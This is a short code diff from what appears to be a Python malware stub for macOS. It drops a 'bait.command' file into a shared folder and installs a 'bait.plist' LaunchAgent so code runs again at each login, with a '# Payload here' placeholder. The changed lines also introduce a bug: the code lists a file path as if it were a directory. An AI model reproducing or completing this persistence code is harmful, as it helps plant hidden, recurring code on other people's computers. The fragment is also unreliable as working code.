@@ -27,8 +27,9 @@ with open(script_path,\"r\") as e:
     with open(shared_path+\"/bait.command\",\"w\") as b:
         b.writelines(filedata)
 
-if not \"bait.plist\" in os.listdir(f\"{dir_path}/Library/LaunchAgents\"):
-    with open(os.path.expanduser(f\"~/Library/LaunchAgents/bait.plist\"),\"w\") as e:
+la_path = os.path.expanduser(\"~/Library/LaunchAgents/bait.plist\")
+if not \"bait.plist\" in os.listdir(la_path):
+    with open(os.path.expanduser(la_path),\"w\") as e:
         e.write(plist_data)
        
 # Payload here
